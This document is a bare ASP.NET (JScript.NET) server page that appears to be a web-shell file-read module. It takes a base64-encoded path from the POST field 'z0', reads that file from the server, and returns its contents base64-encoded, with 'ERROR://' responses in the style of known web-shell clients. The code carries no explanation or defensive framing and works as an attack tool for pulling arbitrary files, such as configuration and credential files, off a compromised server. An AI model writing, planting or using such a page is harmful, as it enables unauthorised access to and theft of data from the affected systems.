<%

function base64Decode(str) {
    if (!str || str.Trim() == "") return "";
    try {
        var bytes = System.Convert.FromBase64String(str);
        return System.Text.Encoding.UTF8.GetString(bytes);
    } catch(e) { return ""; }
}

function fileToBase64(filePath) {
    var fileBytes = System.IO.File.ReadAllBytes(filePath);
    return System.Convert.ToBase64String(fileBytes);
}

Response.Buffer = true;
Response.ContentType = "text/plain";

var z0 = Request.Form["z0"] ? Request.Form["z0"] + "" : "";

try {
    if (z0.Trim() == "") {
        Response.Write("ERROR://No parameter received.");
    } else {
        var szFilePath = base64Decode(z0);

        if (!System.IO.File.Exists(szFilePath)) {
            Response.Write("ERROR://Unable to open file.");
        } else {
            var result = fileToBase64(szFilePath);
            Response.Write(result);
        }
    }
} catch(e) {
    Response.Write("ERROR://Unable to open file.");
}

%>